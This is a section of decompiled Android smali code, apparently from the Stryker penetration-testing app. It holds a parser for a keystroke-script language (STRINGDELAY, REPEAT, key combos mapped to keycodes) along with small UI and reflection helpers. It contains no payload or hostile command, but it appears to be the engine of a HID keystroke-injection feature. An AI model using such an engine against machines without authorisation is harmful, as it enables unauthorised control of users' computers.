    if-lt v1, v7, :cond_38

    const/4 v4, 0x0

    aget-object v1, v0, v4

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v20

    new-instance v6, Lg3/p;

    const/4 v1, 0x1

    aget-object v18, v0, v1

    const/16 v19, 0x0

    move-object/from16 v16, v6

    move/from16 v17, v8

    invoke-direct/range {v16 .. v21}, Lg3/p;-><init>(ILjava/lang/String;ZJ)V

    :goto_13
    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :goto_14
    move v7, v4

    move-object/from16 v3, v22

    move-object/from16 v0, v23

    :goto_15
    move-wide/from16 v14, v24

    :goto_16
    const/4 v1, -0x1

    goto/16 :goto_0

    :cond_38
    new-instance v0, Lg3/a;

    const-string v1, "STRINGDELAY expects <ms> <text>"

    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :pswitch_e
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_39

    :goto_17
    move-wide/from16 v0, v19

    goto :goto_18

    :cond_39
    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v19

    goto :goto_17

    :goto_18
    new-instance v6, Lg3/f;

    invoke-direct {v6, v8, v0, v1}, Lg3/f;-><init>(IJ)V

    goto :goto_13

    :pswitch_f
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    new-instance v6, Lg3/m;

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->m(ILjava/lang/String;)I

    move-result v0

    invoke-direct {v6, v8, v0}, Lg3/m;-><init>(II)V

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v7, v4

    move-object/from16 v0, v23

    goto :goto_16

    :pswitch_10
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    const/4 v4, 0x0

    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->n(ILjava/lang/String;)J

    move-result-wide v14

    move v7, v4

    goto :goto_16

    :pswitch_11
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    new-instance v6, Lg3/p;

    const/4 v14, 0x1

    move-object v11, v6

    move v12, v8

    move-object v13, v1

    move-wide/from16 v15, v24

    invoke-direct/range {v11 .. v16}, Lg3/p;-><init>(ILjava/lang/String;ZJ)V

    :goto_19
    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v7, v4

    goto :goto_15

    :pswitch_12
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    new-instance v6, Lg3/p;

    const/4 v14, 0x0

    move-object v11, v6

    move v12, v8

    move-object v13, v1

    move-wide/from16 v15, v24

    invoke-direct/range {v11 .. v16}, Lg3/p;-><init>(ILjava/lang/String;ZJ)V

    goto :goto_19

    :pswitch_13
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    new-instance v6, Lg3/n;

    .line 19
    invoke-direct {v6, v8}, Lg3/q;-><init>(I)V

    goto/16 :goto_13

    :pswitch_14
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    .line 20
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {v1, v12}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "END"

    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3a

    goto/16 :goto_1

    :cond_3a
    invoke-static {v8, v1}, Landroidx/fragment/app/x0;->m(ILjava/lang/String;)I

    move-result v0

    if-eqz v6, :cond_3c

    move v1, v4

    :goto_1a
    if-ge v1, v0, :cond_0

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const-wide/16 v11, 0x0

    cmp-long v3, v9, v11

    if-lez v3, :cond_3b

    .line 21
    new-instance v3, Lg3/i;

    invoke-direct {v3, v8, v9, v10}, Lg3/i;-><init>(IJ)V

    invoke-virtual {v2, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_3b
    add-int/lit8 v1, v1, 0x1

    goto :goto_1a

    .line 22
    :cond_3c
    new-instance v0, Lg3/a;

    const-string v1, "REPEAT without a preceding step"

    invoke-direct {v0, v8, v1}, Lg3/a;-><init>(ILjava/lang/String;)V

    throw v0

    :pswitch_15
    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v8, v13

    move-wide/from16 v24, v14

    const/4 v4, 0x0

    const-wide/16 v11, 0x0

    new-instance v6, Lg3/o;

    .line 23
    invoke-direct {v6, v8}, Lg3/q;-><init>(I)V

    goto/16 :goto_13

    .line 24
    :cond_3d
    new-instance v0, Lg3/e;

    invoke-direct {v0, v2}, Lg3/e;-><init>(Ljava/util/ArrayList;)V

    return-object v0

    :sswitch_data_0
    .sparse-switch
        -0x72e16ad7 -> :sswitch_1b
        -0x7020de65 -> :sswitch_1a
        -0x6e874b94 -> :sswitch_19
        -0x6d97abef -> :sswitch_18
        -0x665c62ad -> :sswitch_17
        -0x5dcda3e8 -> :sswitch_16
        -0x5bd19c39 -> :sswitch_15
        -0x5a3b27b9 -> :sswitch_14
        -0x57f45015 -> :sswitch_13
        -0x323ba661 -> :sswitch_12
        -0x26e1984b -> :sswitch_11
        -0x3d3c2d2 -> :sswitch_10
        0x5e0 -> :sswitch_f
        0x13c7a -> :sswitch_e
        0x21ecbf -> :sswitch_d
        0x2832a5 -> :sswitch_c
        0x3dec163 -> :sswitch_b
        0x4ec59bd -> :sswitch_a
        0x268d4ff2 -> :sswitch_9
        0x273d0de7 -> :sswitch_8
        0x3df6a9c5 -> :sswitch_7
        0x46c3c72e -> :sswitch_6
        0x4bbb5326 -> :sswitch_5
        0x5abbb34b -> :sswitch_4
        0x62454ecc -> :sswitch_3
        0x639c8be2 -> :sswitch_2
        0x6bccb3e7 -> :sswitch_1
        0x77f6cdbb -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_1
        :pswitch_1
        :pswitch_d
        :pswitch_9
        :pswitch_8
        :pswitch_8
        :pswitch_7
        :pswitch_13
        :pswitch_6
        :pswitch_5
        :pswitch_d
        :pswitch_4
        :pswitch_3
        :pswitch_4
        :pswitch_e
        :pswitch_2
        :pswitch_10
        :pswitch_3
        :pswitch_15
        :pswitch_0
    .end packed-switch

    :sswitch_data_1
    .sparse-switch
        -0x7876326b -> :sswitch_1f
        0x0 -> :sswitch_1e
        0x239807 -> :sswitch_1d
        0x4a5c9fc -> :sswitch_1c
    .end sparse-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_c
        :pswitch_b
        :pswitch_b
        :pswitch_a
    .end packed-switch
.end method

.method public static l(ILjava/lang/String;)Lg3/g;
    .locals 9

    .line 1
    const-string v0, "\\s+|-(?=[A-Za-z])"

    .line 2
    .line 3
    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    move-result-object p1

    .line 7
    array-length v0, p1

    .line 8
    const/4 v1, 0x0

    .line 9
    const/4 v2, 0x0

    .line 10
    move v3, v1

    .line 11
    move v4, v3

    .line 12
    :goto_0
    if-ge v3, v0, :cond_8

    .line 13
    .line 14
    aget-object v5, p1, v3

    .line 15
    .line 16
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    .line 17
    .line 18
    .line 19
    move-result v6

    .line 20
    if-eqz v6, :cond_0

    .line 21
    .line 22
    goto :goto_2

    .line 23
    :cond_0
    sget-object v6, Lg3/d;->a:Ljava/util/Map;

    .line 24
    .line 25
    sget-object v6, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 26
    .line 27
    invoke-virtual {v5, v6}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v7

    .line 31
    sget-object v8, Lg3/d;->a:Ljava/util/Map;

    .line 32
    .line 33
    invoke-interface {v8, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 34
    .line 35
    .line 36
    move-result-object v7

    .line 37
    check-cast v7, Ljava/lang/Integer;

    .line 38
    .line 39
    if-eqz v7, :cond_1

    .line 40
    .line 41
    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    .line 42
    .line 43
    .line 44
    move-result v5

    .line 45
    or-int/2addr v4, v5

    .line 46
    goto :goto_2

    .line 47
    :cond_1
    invoke-virtual {v5, v6}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 48
    .line 49
    .line 50
    move-result-object v2

    .line 51
    sget-object v6, Lg3/d;->b:Ljava/util/Map;

    .line 52
    .line 53
    invoke-interface {v6, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 54
    .line 55
    .line 56
    move-result-object v2

    .line 57
    check-cast v2, Ljava/lang/Integer;

    .line 58
    .line 59
    if-eqz v2, :cond_2

    .line 60
    .line 61
    goto :goto_2

    .line 62
    :cond_2
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    .line 63
    .line 64
    .line 65
    move-result v2

    .line 66
    const/4 v6, 0x1

    .line 67
    if-ne v2, v6, :cond_7

    .line 68
    .line 69
    invoke-virtual {v5, v1}, Ljava/lang/String;->charAt(I)C

    .line 70
    .line 71
    .line 72
    move-result v2

    .line 73
    invoke-static {v2}, Ljava/lang/Character;->toLowerCase(C)C

    .line 74
    .line 75
    .line 76
    move-result v6

    .line 77
    const/16 v7, 0x61

    .line 78
    .line 79
    if-lt v6, v7, :cond_3

    .line 80
    .line 81
    const/16 v7, 0x7a

    .line 82
    .line 83
    if-gt v6, v7, :cond_3

    .line 84
    .line 85
    add-int/lit8 v6, v6, -0x5d

    .line 86
    .line 87
    goto :goto_1

    .line 88
    :cond_3
    const/16 v6, 0x31

    .line 89
    .line 90
    if-lt v2, v6, :cond_4

    .line 91
    .line 92
    const/16 v6, 0x39

    .line 93
    .line 94
    if-gt v2, v6, :cond_4

    .line 95
    .line 96
    add-int/lit8 v6, v2, -0x13

    .line 97
    .line 98
    goto :goto_1

    .line 99
    :cond_4
    const/16 v6, 0x30

    .line 100
    .line 101
    if-ne v2, v6, :cond_5

    .line 102
    .line 103
    const/16 v6, 0x27

    .line 104
    .line 105
    goto :goto_1

    .line 106
    :cond_5
    move v6, v1

    .line 107
    :goto_1
    if-eqz v6, :cond_6

    .line 108
    .line 109
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 110
    .line 111
    .line 112
    move-result-object v2

    .line 113
    :goto_2
    add-int/lit8 v3, v3, 0x1

    .line 114
    .line 115
    goto :goto_0

    .line 116
    :cond_6
    new-instance p1, Lg3/a;

    .line 117
    .line 118
    const-string v0, "Cannot map character \'"

    .line 119
    .line 120
    const-string v1, "\' in combo"

    .line 121
    .line 122
    invoke-static {v0, v5, v1}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 123
    .line 124
    .line 125
    move-result-object v0

    .line 126
    invoke-direct {p1, p0, v0}, Lg3/a;-><init>(ILjava/lang/String;)V

    .line 127
    .line 128
    .line 129
    throw p1

    .line 130
    :cond_7
    new-instance p1, Lg3/a;

    .line 131
    .line 132
    const-string v0, "Unknown token \'"

    .line 133
    .line 134
    const-string v1, "\'"

    .line 135
    .line 136
    invoke-static {v0, v5, v1}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    move-result-object v0

    .line 140
    invoke-direct {p1, p0, v0}, Lg3/a;-><init>(ILjava/lang/String;)V

    .line 141
    .line 142
    .line 143
    throw p1

    .line 144
    :cond_8
    if-nez v2, :cond_a

    .line 145
    .line 146
    if-eqz v4, :cond_9

    .line 147
    .line 148
    new-instance p1, Lg3/g;

    .line 149
    .line 150
    invoke-direct {p1, p0, v4, v1}, Lg3/g;-><init>(III)V

    .line 151
    .line 152
    .line 153
    return-object p1

    .line 154
    :cond_9
    new-instance p1, Lg3/a;

    .line 155
    .line 156
    const-string v0, "Combo missing a keycode"

    .line 157
    .line 158
    invoke-direct {p1, p0, v0}, Lg3/a;-><init>(ILjava/lang/String;)V

    .line 159
    .line 160
    .line 161
    throw p1

    .line 162
    :cond_a
    new-instance p1, Lg3/g;

    .line 163
    .line 164
    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    .line 165
    .line 166
    .line 167
    move-result v0

    .line 168
    invoke-direct {p1, p0, v4, v0}, Lg3/g;-><init>(III)V

    .line 169
    .line 170
    .line 171
    return-object p1
.end method

.method public static m(ILjava/lang/String;)I
    .locals 3

    .line 1
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    .line 6
    .line 7
    .line 8
    move-result p0
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    .line 9
    return p0

    .line 10
    :catch_0
    new-instance v0, Lg3/a;

    .line 11
    .line 12
    const-string v1, "Expected integer, got \'"

    .line 13
    .line 14
    const-string v2, "\'"

    .line 15
    .line 16
    invoke-static {v1, p1, v2}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object p1

    .line 20
    invoke-direct {v0, p0, p1}, Lg3/a;-><init>(ILjava/lang/String;)V

    .line 21
    .line 22
    .line 23
    throw v0
.end method

.method public static n(ILjava/lang/String;)J
    .locals 3

    .line 1
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    invoke-static {v0}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    .line 6
    .line 7
    .line 8
    move-result-wide p0
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    .line 9
    return-wide p0

    .line 10
    :catch_0
    new-instance v0, Lg3/a;

    .line 11
    .line 12
    const-string v1, "Expected integer milliseconds, got \'"

    .line 13
    .line 14
    const-string v2, "\'"

    .line 15
    .line 16
    invoke-static {v1, p1, v2}, Lorg/bouncycastle/math/ec/a;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 17
    .line 18
    .line 19
    move-result-object p1

    .line 20
    invoke-direct {v0, p0, p1}, Lg3/a;-><init>(ILjava/lang/String;)V

    .line 21
    .line 22
    .line 23
    throw v0
.end method

.method public static p(Ljava/lang/String;)[Ljava/lang/String;
    .locals 3

    .line 1
    const/4 v0, 0x0

    move v1, v0

    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_1

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    invoke-static {v2}, Ljava/lang/Character;->isWhitespace(C)Z

    move-result v2

    if-eqz v2, :cond_0

    goto :goto_1

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    const/4 v1, -0x1

    :goto_1
    if-gez v1, :cond_2

    filled-new-array {p0}, [Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_2
    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {p0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p0

    filled-new-array {v0, p0}, [Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static q(Landroid/view/View;IZ)V
    .locals 3

    .line 1
    invoke-virtual {p0, p2}, Landroid/view/View;->setActivated(Z)V

    .line 2
    .line 3
    .line 4
    invoke-virtual {p0}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 5
    .line 6
    .line 7
    move-result-object v0

    .line 8
    const v1, 0x7f0a0537

    .line 9
    .line 10
    .line 11
    invoke-virtual {p0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    .line 12
    .line 13
    .line 14
    move-result-object v1

    .line 15
    check-cast v1, Landroid/widget/TextView;

    .line 16
    .line 17
    const v2, 0x7f0a0531

    .line 18
    .line 19
    .line 20
    invoke-virtual {p0, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    .line 21
    .line 22
    .line 23
    move-result-object p0

    .line 24
    check-cast p0, Landroid/widget/ImageView;

    .line 25
    .line 26
    sget-object v2, Lcom/zalexdev/stryker/MainActivity;->x:Ljava/util/LinkedHashMap;

    .line 27
    .line 28
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 29
    .line 30
    .line 31
    move-result-object p1

    .line 32
    invoke-virtual {v2, p1}, Ljava/util/LinkedHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 33
    .line 34
    .line 35
    move-result-object p1

    .line 36
    check-cast p1, Lj2/n;

    .line 37
    .line 38
    const/4 v2, 0x0

    .line 39
    if-eqz p2, :cond_1

    .line 40
    .line 41
    if-eqz v1, :cond_0

    .line 42
    .line 43
    sget-object p2, Lx/g;->a:Ljava/lang/Object;

    .line 44
    .line 45
    const p2, 0x7f060316

    .line 46
    .line 47
    .line 48
    invoke-static {v0, p2}, Lx/d;->a(Landroid/content/Context;I)I

    .line 49
    .line 50
    .line 51
    move-result p2

    .line 52
    invoke-virtual {v1, p2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 53
    .line 54
    .line 55
    const/4 p2, 0x1

    .line 56
    invoke-virtual {v1, v2, p2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 57
    .line 58
    .line 59
    :cond_0
    if-eqz p0, :cond_3

    .line 60
    .line 61
    if-eqz p1, :cond_3

    .line 62
    .line 63
    iget p1, p1, Lj2/n;->c:I

    .line 64
    .line 65
    :goto_0
    invoke-virtual {p0, p1}, Landroid/widget/ImageView;->setColorFilter(I)V

    .line 66
    .line 67
    .line 68
    goto :goto_1

    .line 69
    :cond_1
    if-eqz v1, :cond_2

    .line 70
    .line 71
    sget-object p1, Lx/g;->a:Ljava/lang/Object;

    .line 72
    .line 73
    const p1, 0x7f0602f2

    .line 74
    .line 75
    .line 76
    invoke-static {v0, p1}, Lx/d;->a(Landroid/content/Context;I)I

    .line 77
    .line 78
    .line 79
    move-result p1

    .line 80
    invoke-virtual {v1, p1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 81
    .line 82
    .line 83
    const/4 p1, 0x0

    .line 84
    invoke-virtual {v1, v2, p1}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 85
    .line 86
    .line 87
    :cond_2
    if-eqz p0, :cond_3

    .line 88
    .line 89
    sget-object p1, Lx/g;->a:Ljava/lang/Object;

    .line 90
    .line 91
    const p1, 0x7f060074

    .line 92
    .line 93
    .line 94
    invoke-static {v0, p1}, Lx/d;->a(Landroid/content/Context;I)I

    .line 95
    .line 96
    .line 97
    move-result p1

    .line 98
    goto :goto_0

    .line 99
    :cond_3
    :goto_1
    return-void
.end method


# virtual methods
.method public a(Ljava/lang/Class;)Landroidx/lifecycle/s0;
    .locals 1

    .line 1
    iget p1, p0, Landroidx/fragment/app/x0;->a:I

    .line 2
    .line 3
    packed-switch p1, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    new-instance p1, Lv0/b;

    .line 7
    .line 8
    invoke-direct {p1}, Lv0/b;-><init>()V

    .line 9
    .line 10
    .line 11
    return-object p1

    .line 12
    :pswitch_0
    new-instance p1, Landroidx/fragment/app/y0;

    .line 13
    .line 14
    const/4 v0, 0x1

    .line 15
    invoke-direct {p1, v0}, Landroidx/fragment/app/y0;-><init>(Z)V

    .line 16
    .line 17
    .line 18
    return-object p1

    .line 19
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method

.method public b(I)I
    .locals 1

    .line 1
    iget v0, p0, Landroidx/fragment/app/x0;->a:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    invoke-static {p1}, Landroid/graphics/Color;->blue(I)I

    .line 7
    .line 8
    .line 9
    move-result p1

    .line 10
    return p1

    .line 11
    :pswitch_0
    invoke-static {p1}, Landroid/graphics/Color;->green(I)I

    .line 12
    .line 13
    .line 14
    move-result p1

    .line 15
    return p1

    .line 16
    :pswitch_1
    invoke-static {p1}, Landroid/graphics/Color;->red(I)I

    .line 17
    .line 18
    .line 19
    move-result p1

    .line 20
    return p1

    .line 21
    :pswitch_2
    invoke-static {p1}, Landroid/graphics/Color;->alpha(I)I

    .line 22
    .line 23
    .line 24
    move-result p1

    .line 25
    return p1

    .line 26
    nop

    .line 27
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public o(ILandroid/view/View;)V
    .locals 3

    .line 1
    sget-boolean v0, Landroidx/fragment/app/x0;->c:Z

    if-nez v0, :cond_0

    const/4 v0, 0x1

    :try_start_0
    const-class v1, Landroid/view/View;

    const-string v2, "mViewFlags"

    invoke-virtual {v1, v2}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    sput-object v1, Landroidx/fragment/app/x0;->b:Ljava/lang/reflect/Field;

    invoke-virtual {v1, v0}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V
    :try_end_0
    .catch Ljava/lang/NoSuchFieldException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const-string v1, "ViewUtilsBase"

    const-string v2, "fetchViewFlagsField: "

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    sput-boolean v0, Landroidx/fragment/app/x0;->c:Z

    :cond_0
    sget-object v0, Landroidx/fragment/app/x0;->b:Ljava/lang/reflect/Field;

    if-eqz v0, :cond_1

    :try_start_1
    invoke-virtual {v0, p2}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I

    move-result v0

    sget-object v1, Landroidx/fragment/app/x0;->b:Ljava/lang/reflect/Field;

    and-int/lit8 v0, v0, -0xd

    or-int/2addr p1, v0

    invoke-virtual {v1, p2, p1}, Ljava/lang/reflect/Field;->setInt(Ljava/lang/Object;I)V
    :try_end_1
    .catch Ljava/lang/IllegalAccessException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    return-void
.end method
